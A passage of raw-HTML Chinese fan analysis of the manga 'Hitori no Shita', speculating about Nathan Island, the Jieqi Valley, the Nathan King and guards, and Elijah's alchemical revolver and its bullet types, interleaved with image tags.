data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><b>2.纳森岛和节气谷</b></p>\n<p>很多朋友应该知道，所谓纳森就是无，因为毕游龙在说纳森卫的时候纳森对应的英语就是Nothing，如果通俗来说，纳森就是无，即不存在的岛屿；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-987bc9d9ed460b215d00c8f0b5271a78_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"215\" data-watermark=\"watermark\" data-original-src=\"v2-987bc9d9ed460b215d00c8f0b5271a78\" data-watermark-src=\"v2-53ac5bb62fbb78958367e416ed4c9414\" data-private-watermark-src=\"\"></p>\n<p>不过大家结合漫画530（562）话神秘人跳海之后的这一格镜头看（建议直接看原版漫画比较清晰）神秘人并不是直接消失的，空气中有一些线条，勾勒出类似空间扭曲的效果（当然这里也有很大几率是线稿和后期对接时的处理问题，所以这里只是作为引子不作为直接证据）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4fbd7b9373eeb8cdd93d1f1a6d95b62f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"842\" data-rawheight=\"356\" data-watermark=\"watermark\" data-original-src=\"v2-4fbd7b9373eeb8cdd93d1f1a6d95b62f\" data-watermark-src=\"v2-98b1d347fa5a27fdbfe4062506cac688\" data-private-watermark-src=\"\"></p>\n<p>而同样的在下面的画面中，神秘人也是直接出现在了纳森岛上；没有来时的路径（同样建议直接看原版漫画比较清晰）；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b5f5bb40d0439fbd909b7dfa31a2c0c1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"846\" data-rawheight=\"559\" data-watermark=\"watermark\" data-original-src=\"v2-b5f5bb40d0439fbd909b7dfa31a2c0c1\" data-watermark-src=\"v2-a634a184a8300169b51d21f3408494a9\" data-private-watermark-src=\"\"></p>\n<p>不过也要提醒以上两格分镜在时间上并不是直接联系的，因为神秘人说了，一路上见到了不少暴尸野骨；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8be882ba11be33c4cb39ed186a8bcf79_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"843\" data-rawheight=\"244\" data-watermark=\"watermark\" data-original-src=\"v2-8be882ba11be33c4cb39ed186a8bcf79\" data-watermark-src=\"v2-72908b26bc3423804b0136be7aedfd11\" data-private-watermark-src=\"\"></p>\n<p>那么同样的空间转移剧情，其实之前在节气谷也出现过；在漫画326话请务必带上我们中，以利亚的原话是阿郎和我的另一个同伴（指坎贝尔）已经进入了目的地了，而从后续剧情我们可以知道，这里的目的地指的就是节气谷中的何为人洞；那么我们有理由确信与此同时阿郎和坎贝尔应该是在秦岭深处移动的；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cc2f1ff383260ce24fbb8cf0b762a903_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"698\" data-rawheight=\"243\" data-watermark=\"watermark\" data-original-src=\"v2-cc2f1ff383260ce24fbb8cf0b762a903\" data-watermark-src=\"v2-732f663322456dc48302471acf9fa663\" data-private-watermark-src=\"\"></p>\n<p>但是话锋一转，阿郎就出现在了广告牌下（总不至可口可乐的广告已经打到了深山里给猴子看吧）而阿郎也被汽车压死了；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-363bd99b5765b4ff162c43879ddc40d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"730\" data-rawheight=\"295\" data-watermark=\"watermark\" data-original-src=\"v2-363bd99b5765b4ff162c43879ddc40d9\" data-watermark-src=\"v2-fb7270f7087c7040d3db2d3f57ef915d\" data-private-watermark-src=\"\"></p>\n<p>而更能确定节气谷空间上出现问题的，其实不是阿郎，而是坎贝尔；因为阿郎知道坎贝尔的死，以利亚也说了他们是一起行动的；但是在哪都通方面找到阿郎尸体的时候，档案上只有阿郎，乃至于后来毕游龙找到以利亚的时候，哪都通方面都没掌握坎贝尔的死亡信息；也就是说，要么是公司的人办事不力，让另一个入侵者死在周围而不自知，要么就是坎贝尔死亡的地点与阿郎并不在一处；</p>\n<p>（当然以上不排除阿郎真的凭借自身手段逃出了节气谷的可能性，只不过如果是这样就比较难与以利亚的说法对上了）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1a140d3c47638e98c94c0b7f381979c8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"721\" data-rawheight=\"332\" data-watermark=\"watermark\" data-original-src=\"v2-1a140d3c47638e98c94c0b7f381979c8\" data-watermark-src=\"v2-8e9a806d86100689555b513cced1b44d\" data-private-watermark-src=\"\"></p>\n<p>让我们回到1944年，在三十六贼初入节气谷的时候，古崎亭说过：气局是气形成的格局，气局本身就是个怪物；不管是善地还是恶地都必须要准守他自己的规矩才行（漫画497话）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c6cd67aea04785db56ccf27733223263_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"767\" data-rawheight=\"346\" data-watermark=\"watermark\" data-original-src=\"v2-c6cd67aea04785db56ccf27733223263\" data-watermark-src=\"v2-9ea7d01cb4414f68d46157321095c108\" data-private-watermark-src=\"\"></p>\n<p>一旦有其他的气流闯入，越是精密强大的格局也约束会被气局的格局所冲击（按照周圣的说法：这是超越时间的冲击）；而人本身就是最精密的格局；从某种意义上来说，这种地方本身就是一种活物，而这种修正手段类似于人体的免疫系统；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7ac2edad3864afc9d1f505785ac250ea_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"729\" data-rawheight=\"280\" data-watermark=\"watermark\" data-original-src=\"v2-7ac2edad3864afc9d1f505785ac250ea\" data-watermark-src=\"v2-10ab40f61b724eb7c309a081c844a622\" data-private-watermark-src=\"\"></p>\n<p>如果不遵守他内部的规矩，哪怕和当年自然门的门长一样逃出来了，也难逃命运的追杀（这可能就是目前古崎亭面临的问题）因为因果会自行修正自身的不合理处；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2fb8248b373124deef1e45c729dc8291_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"731\" data-rawheight=\"326\" data-watermark=\"watermark\" data-original-src=\"v2-2fb8248b373124deef1e45c729dc8291\" data-watermark-src=\"v2-166c64b65c9df6c4ad966aea86e49488\" data-private-watermark-src=\"\"></p>\n<p>从目前耀星社掌握的情报来看（应该也做过实验）通往节气谷的路虽然有，但也从没有人能活着走完过；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c79c09d3884c4e03e9a32e38f8466815_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"701\" data-rawheight=\"249\" data-watermark=\"watermark\" data-original-src=\"v2-c79c09d3884c4e03e9a32e38f8466815\" data-watermark-src=\"v2-02ae3ed634cf6d5081d0eec622617822\" data-private-watermark-src=\"\"></p>\n<p>纳森岛也一样，所以面对一路的白骨尸骸，纳森王（疑似）的评价是：这就是这里的法则，这就是太平；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cad9a783c311635ea2394c46c88d1b10_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"702\" data-rawheight=\"251\" data-watermark=\"watermark\" data-original-src=\"v2-cad9a783c311635ea2394c46c88d1b10\" data-watermark-src=\"v2-b886eb482b6c1c36f1be5e8e02479d6d\" data-private-watermark-src=\"\"></p>\n<p>而 漫画530（562）中这些船在海上遭遇到的情况其实和当时在节气谷上方的直升机的遭遇是一模一样的；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bf707c6665c6ea4f162d8143f5953eb9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"730\" data-rawheight=\"316\" data-watermark=\"watermark\" data-original-src=\"v2-bf707c6665c6ea4f162d8143f5953eb9\" data-watermark-src=\"v2-a1b3d25053e92900c8ec9179e96110f7\" data-private-watermark-src=\"\"></p>\n<p>同样是信号被切断，同样是方向失灵；那结局估计也是相似的；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-bdba958ccddc978a4ff42f0c80af1423_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1600\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-bdba958ccddc978a4ff42f0c80af1423\" data-watermark-src=\"v2-fef3ab14ea9797f7429a60278e595361\" data-private-watermark-src=\"\"></p>\n<p>值得注意的是，在进入节气谷后，以利亚对节气谷的评价是：我不喜欢这种感觉，感觉又回到了纳森一样；这里有两层意思，第一是不喜欢，第二是这里和纳森一样；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bfd376895bd12b79b336a0aaaafcb8a5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1325\" data-rawheight=\"920\" data-watermark=\"watermark\" data-original-src=\"v2-bfd376895bd12b79b336a0aaaafcb8a5\" data-watermark-src=\"v2-0999d0ba16e04d7d0fc2ac98fb281106\" data-private-watermark-src=\"\"></p>\n<p><b>3.纳森王</b></p>\n<p>纳森王（the King）这个词第一次出现于毕游龙与以利亚的谈话；谈话中我们可以知道纳森王与世俗世界之间是定下了一些规则的；而其中一条就是只有王和卫被这个世界所认可；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1975c1720ba4098ec9cbab1a1aac6802_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"201\" data-watermark=\"watermark\" data-original-src=\"v2-1975c1720ba4098ec9cbab1a1aac6802\" data-watermark-src=\"v2-25e7e8efd81b172b84e663eb5eb06496\" data-private-watermark-src=\"\"></p>\n<p>而在来到中国的四人中只有以利亚是纳森卫，所以以利亚说：我倒是好办，就是我的同伴有点麻烦；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-47bba7054428c8db28911b6a5dc1b263_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"730\" data-rawheight=\"191\" data-watermark=\"watermark\" data-original-src=\"v2-47bba7054428c8db28911b6a5dc1b263\" data-watermark-src=\"v2-1025fafb93baa264063d922ef7560699\" data-private-watermark-src=\"\"></p>\n<p>所以毕游龙说以利亚在中国可以受到最高规格的优待；国家的最高规格，可能就是就是国务卿待遇了吧（个人猜测），那也可以间接认为，纳森岛是一个不被各国政府承认的“国家”；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4b854f65cb767c82eafd1590f2799265_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"731\" data-rawheight=\"297\" data-watermark=\"watermark\" data-original-src=\"v2-4b854f65cb767c82eafd1590f2799265\" data-watermark-src=\"v2-7fea54ab1430fb34fa3d5b986e6f1bdf\" data-private-watermark-src=\"\"></p>\n<p>而这些纳森岛的异人，我们从之前调查阿郎的情况可以看出来，阿郎五年前其实还拥有普通人的身份，是在五年前才被销毁的，那也有理由猜测，纳森的部分岛民是在后来才加入的；从以利亚的对纳森岛的评价来看（不喜欢）这些人可能是被迫（流放或者逃离）才选择的纳森岛，</p>\n<p><img src=\"https://pic4.zhimg.com/v2-27f67ba80fa0e22b10cc8cd03b95ef14_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"729\" data-rawheight=\"241\" data-watermark=\"watermark\" data-original-src=\"v2-27f67ba80fa0e22b10cc8cd03b95ef14\" data-watermark-src=\"v2-07e65308befa41ba82a408fe0b79ad75\" data-private-watermark-src=\"\"></p>\n<p>所以纳森岛可能并不是一个世外桃源，而是一个开放异人能力的丛林社会；也就是所谓的“太平”状态，而这位（疑似King）所说的咱那边以及新朋友，其实都有两种可能性，第一种就是我上面提到的，咱那边指他过去生活的社会，而新朋友指的是那些近几年来到岛上的人，类似于阿郎（至于第二种猜测则先卖个关子）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-73e9f184953b360d404e0b70e7fc20e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"878\" data-rawheight=\"265\" data-watermark=\"watermark\" data-original-src=\"v2-73e9f184953b360d404e0b70e7fc20e2\" data-watermark-src=\"v2-2f870a1b5ccd47afb97addd76cfe0111\" data-private-watermark-src=\"\"></p>\n<p>以利亚这段话信息量非常大，第一句，我们可以知道这位首领很喜欢中国，可能感兴趣的是中国的异人能力；他应该不是中国人；但注意一点，这里用的称呼是首领（leader）而不是王(King)那么这里大概率指的是纳森卫的头头而不是纳森王；甚至个人猜测，纳森王不是个人（至少可能现在不是了）</p>\n<p>第二句话非常难以捉摸，岛上的树长得非常快；那么这里有几种猜测，第一种岛上的树和岛上的异人有某种联系树长得好说明这个岛上的气局在发展，岛上异人能力大幅提升；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-acb4ae32fdf596352d2d7a85ba631edb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1052\" data-rawheight=\"534\" data-watermark=\"watermark\" data-original-src=\"v2-acb4ae32fdf596352d2d7a85ba631edb\" data-watermark-src=\"v2-b468c49ebc630296ea1cb03cb848c747\" data-private-watermark-src=\"\"></p>\n<p>第二种联系和毕游龙谈话的前言来看，这个岛和他们的（King）可能有某种联系，所以树可能是王的一部分，所以，这一格分镜里的人是在洞里还是借着洞在说话？（纯个人脑洞）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9b33ff992afa26988ae0024db8426eac_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"875\" data-rawheight=\"356\" data-watermark=\"watermark\" data-original-src=\"v2-9b33ff992afa26988ae0024db8426eac\" data-watermark-src=\"v2-504b9b5f8f06c52d5f55b052e8c2f51f\" data-private-watermark-src=\"\"></p>\n<p>不过至少肯定树木生长意味着王的什么变化，所以听到这句话毕游龙才是这个反映；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5d9df34ee10bdb79ac9a100cd421e857_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"887\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-5d9df34ee10bdb79ac9a100cd421e857\" data-watermark-src=\"v2-8bd05561d409f8c48aa67705b59bbe6d\" data-private-watermark-src=\"\"></p>\n<p>这里的公开是指公开什么？我们不得而知，但可以肯定，这里的王以及他的秘密都是与我们一直说的气与异人有关的，因为如果超过这些的事件，其实是归另一个部门管理的；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-827a08d727cd3d522df367c046b17947_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"887\" data-rawheight=\"319\" data-watermark=\"watermark\" data-original-src=\"v2-827a08d727cd3d522df367c046b17947\" data-watermark-src=\"v2-97c4f5d8c01b797dd4e1c3df914a16a3\" data-private-watermark-src=\"\"></p>\n<p>目前已经出现的角色中，最可能的纳森王的，就是这位在恒河岸边把弘达从无尽苦修中解脱出来的人，他有着和无根生一样无师自通的才能与天赋，从某种意义上来说，目前已有名字的角色中还没有如此天赋的人（包括张之维和无根生，这里的天赋是指领悟能力）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9e8d2d86519fd70f595c51e6a59f9fbc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"312\" data-watermark=\"watermark\" data-original-src=\"v2-9e8d2d86519fd70f595c51e6a59f9fbc\" data-watermark-src=\"v2-f3171bf88a38a27b811aec47a0fcd25e\" data-private-watermark-src=\"\" data-tags=\"politic\"></p>\n<p><br></p>\n<p><b>4.纳森卫</b></p>\n<p>knight 来自古英语 cniht ，字面意思是“年轻人、仆人”;我认为翻译成仆从的可能性比骑士要高；不过，无论二者是哪一种关系，以利亚说称呼的首领似乎都不是一个好的称谓；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-987bc9d9ed460b215d00c8f0b5271a78_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"215\" data-watermark=\"watermark\" data-original-src=\"v2-987bc9d9ed460b215d00c8f0b5271a78\" data-watermark-src=\"v2-53ac5bb62fbb78958367e416ed4c9414\" data-private-watermark-src=\"\"></p>\n<p>前面借阿郎我们说了，纳森岛民可能很多原本都是普通异人，现在来说一下，纳森卫；剧情中第一次提到纳森卫刘胖子就给了一个定义：为承诺而生的人；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-909b21b6f7cc518f79dab3e566b9d9d5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"701\" data-rawheight=\"252\" data-watermark=\"watermark\" data-original-src=\"v2-909b21b6f7cc518f79dab3e566b9d9d5\" data-watermark-src=\"v2-f52a852410f142633decbc1c5a0cc4b8\" data-private-watermark-src=\"\"></p>\n<p>另一方面，在拜尔德教授的请求下，以利亚说，你付不起我的报酬的；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-aa70ab3e09e00d9a49d182785fcd625a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"891\" data-rawheight=\"326\" data-watermark=\"watermark\" data-original-src=\"v2-aa70ab3e09e00d9a49d182785fcd625a\" data-watermark-src=\"v2-f925e99f5d04cfce37a4da1dbf543a54\" data-private-watermark-src=\"\"></p>\n<p>拜尔德教授有多厉害呢？我们从刘胖子口中得知，他可以在中国领空调动直升机（调动私人直升机不厉害，在中国领空调用私人直升机，那很厉害）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-909436dca46cd0dd74f54caa985d15bd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"891\" data-rawheight=\"274\" data-watermark=\"watermark\" data-original-src=\"v2-909436dca46cd0dd74f54caa985d15bd\" data-watermark-src=\"v2-3915b4511c32e3b713b407deb641580a\" data-private-watermark-src=\"\"></p>\n<p>（是某种可以分开交付的报酬）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cdae203922e99bc41ec0f4e4a6bfc7cb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"299\" data-watermark=\"watermark\" data-original-src=\"v2-cdae203922e99bc41ec0f4e4a6bfc7cb\" data-watermark-src=\"v2-6fa9f72d5dd68f5888e0e5a409b612b4\" data-private-watermark-src=\"\"></p>\n<p>那么很显然以利亚的报酬和金钱无关；那么问题又来了，刘胖子（或者说曜星社）是怎么请的动纳森卫的呢？这个我们不得而知，但很明显，从他们的对话中我们得知纳森岛那边是知道无根生的；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b225bf478b6e451b703f0af066ec4c49_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"698\" data-rawheight=\"280\" data-watermark=\"watermark\" data-original-src=\"v2-b225bf478b6e451b703f0af066ec4c49\" data-watermark-src=\"v2-0b089d468e2d36c43a37d7ae2bbdbd27\" data-private-watermark-src=\"\"></p>\n<p>刚刚看到很多人，认为纳森王就是无根生；其实如果从刘向大家介绍全性的这段剧情来看，纳森卫应该是不知道无根生这个名字的；（见下图）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-35cd79368ead21316c212115aa61521b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"884\" data-rawheight=\"460\" data-watermark=\"watermark\" data-original-src=\"v2-35cd79368ead21316c212115aa61521b\" data-watermark-src=\"v2-36e7b0819c225106fa794521c8307109\" data-private-watermark-src=\"v2-26449e8c7a7cf433f78c4e1575f1e33f\"></p>\n<p><br></p>\n<p><br></p>\n<p><b>5.他们的世界 </b></p>\n<p>以利亚曾说过，何为人山谷的诅咒和“我们”的世界有关；结合当时的语境，很容易得出，这个“我们”应该是指异人，所以当时也没深究了；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2c0d1806a1452612e7fc3a953f991ab6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"698\" data-rawheight=\"267\" data-watermark=\"watermark\" data-original-src=\"v2-2c0d1806a1452612e7fc3a953f991ab6\" data-watermark-src=\"v2-12667ca594db33b640fb71eedb4694ce\" data-private-watermark-src=\"\"></p>\n<p>但是漫画530（562）话我上面提到的，“咱们那边”的另一种可能；（纯属脑洞）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5c922ceaceacdd0b2b621585a987a4c7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"879\" data-rawheight=\"266\" data-watermark=\"watermark\" data-original-src=\"v2-5c922ceaceacdd0b2b621585a987a4c7\" data-watermark-src=\"v2-ac5e15bc3f70c83c5c6988c42c55701f\" data-private-watermark-src=\"\"></p>\n<p>卢道长说过风后奇门会演化（幻化）出无数个世界，但是诸葛青告诉我们其实现实中有些世界（比如术士的内景世界）是连通的，那边没有时间空间，却有自成一派的物理法则；从某种意义上说，那边也是真实的世界；</p>\n<p>那么这里说的那边，有可能也是一个世界，一个时间之外的世界（这里的猜测主要是为了和大罗洞观形成联系）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7d060c21f83584911100710e4977863d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"925\" data-rawheight=\"422\" data-watermark=\"watermark\" data-original-src=\"v2-7d060c21f83584911100710e4977863d\" data-watermark-src=\"v2-4f68c0eac46624723d033bb9f4d8c4a2\" data-private-watermark-src=\"\"></p>\n<p>结合以上猜想，再来看以利亚这句，我们不是神选之人，这既有可能是指天赋，也有可能是纳森岛概念上是某种真的存在的“神”（这里主要是回应芭莎小姐之前的异人即是神选之人观念）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d93a592ffd27956b5d03ec20603e77a1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"888\" data-rawheight=\"326\" data-watermark=\"watermark\" data-original-src=\"v2-d93a592ffd27956b5d03ec20603e77a1\" data-watermark-src=\"v2-e3e9bb45f09fff26abe35714b6724d6b\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p><b>炼金术</b> </p>\n<p>炼金术（Alchemy）是中世纪的一种化学哲学的思想和始祖，是当代化学的雏形。其主要目标是将贱金属转变为贵金属，尤其是黄金。后来又发展出不同的研究，比如制造万能药（例如阿佐特），寻获贤者之石以及创造人造人（Homunculus）。 一人之下其实也涉及到相关设定了，后面会提到；</p>\n<p>直到19世纪之前，炼金术尚未被科学证据所否定。包括艾萨克·牛顿在内的一些著名科学家都曾进行过炼金术尝试。现代化学的出现才使人们对炼金术的可能性产生了怀疑。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d016e92e567e0fb64e7143690737db82_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"887\" data-rawheight=\"241\" data-watermark=\"watermark\" data-original-src=\"v2-d016e92e567e0fb64e7143690737db82\" data-watermark-src=\"v2-b43f25d02a3eebb4d475d634d89aa5f0\" data-private-watermark-src=\"\"></p>\n<p>在漫画《钢之炼金术师》中传说亚美斯多利斯的炼金术是一位名为“东之贤者”的人带来的，因为他是从亚美斯多利斯的东边来的。而新国的炼丹术是由被称为“西之贤者”的人带来的，“西之贤者”是从新国西边来的。所以亚美斯多利斯的炼金术与新国的炼丹术是同源的，都是源于克鲁克赛斯，但是两种术却也有着血海深仇的关系，因为亚美斯多利斯炼金术的造就者正是毁灭克鲁克赛斯的元凶，而炼丹术最初正是克鲁克赛斯的炼金术。（扯远了哈）</p>\n<p><br></p>\n<p><b>1.以利亚的枪</b></p>\n<p>以利亚是目前唯一出场的纳森卫，手段主要是依靠一把炼金改造的左轮枪，从样式上看和中国的炼器其实区别挺大的*（中国的炼器一般主要靠气的喂养，不怎么追求器物本身的机关与设计），我们所谓的左轮枪名字由来，就是因为那个可以转动供弹的弹巢。仔细看以利亚左轮枪的弹巢，上面是有类似节气谷花纹的纹路的个人猜测这是帮助用气驱动枪的（异人的本质还是用气）</p>\n<p>另外注意看以利亚弹巢上每个子弹对应的地方有不同字符；以下就按照他的功能简单梳理一下（名字是自己起的）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a4e5e3b1c31e9441e198905a5b3711f2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"225\" data-watermark=\"watermark\" data-original-src=\"v2-a4e5e3b1c31e9441e198905a5b3711f2\" data-watermark-src=\"v2-1306a389a3e5c910a3531d74594479bf\" data-private-watermark-src=\"\"></p>\n<p><b>金色子弹</b>（名字是自己随便起的，能力是一击打出好几发子弹）</p>\n<p>以利亚第一次出手时所用的子弹，速度极快，瞬间在超近的距离秒杀了两只节气谷的猴子；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8f3024c85bbf3cd696ac9345aa37cbbe_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"971\" data-rawheight=\"449\" data-watermark=\"watermark\" data-original-src=\"v2-8f3024c85bbf3cd696ac9345aa37cbbe\" data-watermark-src=\"v2-7ee5c15fd6e45f0a249a88417ed978b2\" data-private-watermark-src=\"\"></p>\n<p>以利亚对战王震球时也用出了这种子弹，一击就打出了许多子弹来打碎王震球的猴子猴孙；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c642b2c48d4081ab92d53564ad41ecaa_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"699\" data-rawheight=\"285\" data-watermark=\"watermark\" data-original-src=\"v2-c642b2c48d4081ab92d53564ad41ecaa\" data-watermark-src=\"v2-27b9af6cdcad53d1813b0ab015ecd8b9\" data-private-watermark-src=\"\"></p>\n<p><b>红色子弹</b>（名字是自己随便起的，能力是超大威力和持续输出）</p>\n<p>以利亚曾和王震球的如意金箍棒对波，并且在最大功率时赢下了王震球；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f6f916d002b8bc66205ef6ab08c92d9d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"224\" data-watermark=\"watermark\" data-original-src=\"v2-f6f916d002b8bc66205ef6ab08c92d9d\" data-watermark-src=\"v2-8b08789967a88acfe348e5bbeb2e3a85\" data-private-watermark-src=\"\"></p>\n<p>最大功率的样子；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-066714a9ec60a3062e3b37716211d3b8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"971\" data-rawheight=\"551\" data-watermark=\"watermark\" data-original-src=\"v2-066714a9ec60a3062e3b37716211d3b8\" data-watermark-src=\"v2-e875512a5b1ec0fac875ce4cc36f8280\" data-private-watermark-src=\"\"></p>\n<p>蓝色子弹（名字是自己随便起的，会自主追踪对方的气）</p>\n<p>以利亚曾用来追踪黑暗中的王震球的子弹，像是蛇一样灵活，并且会自主追踪对方的气；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-90383f285238a83e1b3465723f5f9f42_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"252\" data-watermark=\"watermark\" data-original-src=\"v2-90383f285238a83e1b3465723f5f9f42\" data-watermark-src=\"v2-f5682a95018b6d5ccff79201038b255f\" data-private-watermark-src=\"\"></p>\n<p>下图为子弹自主绕后，回马枪袭击王震球；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9d2c73613b67004811cf490b448a58e5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"883\" data-rawheight=\"398\" data-watermark=\"watermark\" data-original-src=\"v2-9d2c73613b67004811cf490b448a58e5\" data-watermark-src=\"v2-ff09ce650ec7a4f84dc845b24c65991f\" data-private-watermark-src=\"\"></p>\n<p>以利亚曾用不知名的子弹来隔着人打碎了小黑的照相机；（当然这里因为小黑不是异人所以看不到子弹类型）所以估计是比较灵活的蓝色子弹，不过猜测以利亚的大多数子弹可能都会拐弯；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c43c96996181b0fda459349ce5429591_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"698\" data-rawheight=\"274\" data-watermark=\"watermark\" data-original-src=\"v2-c43c96996181b0fda459349ce5429591\" data-watermark-src=\"v2-4166c11d0b10d590379b04a58cd13153\" data-private-watermark-src=\"\"></p>\n<p> 王震球评价（当然这里评价的是子弹）这颗小小的子弹，背后是数千年来种群文化的结晶，哪怕金光咒，如果有一丝一毫的懈怠或者动摇，经年苦修的成果可能就轻易的被几块钱一发的子弹给摧毁了；联系当年唐门与日军的战斗，如果不是乌梢甲，李鼎也很难轻易对付那么多普通日军的正面火力；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-001f07f8599b1f5f1d326343d1c5f82e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"361\" data-watermark=\"watermark\" data-original-src=\"v2-001f07f8599b1f5f1d326343d1c5f82e\" data-watermark-src=\"v2-672d131abd1e90194d66c5ed977e3c71\" data-private-watermark-src=\"\" data-tags=\"politic\"></p>\n<p>肉搏能力</p>\n<p>虽然一直在夸中国练气师的体格，但其实除了依靠炼金左轮外，以利亚的身体素质也挺出色的，曾轻松捏碎节气谷猴子的脑袋；这个条件反射，可以看出是有非常多的实战经验做支撑的；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-616c0d724d3d3e79b69eca4162e347f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"697\" data-rawheight=\"287\" data-watermark=\"watermark\" data-original-src=\"v2-616c0d724d3d3e79b69eca4162e347f3\" data-watermark-src=\"v2-63d6a7a14162df727def730f868c8453\" 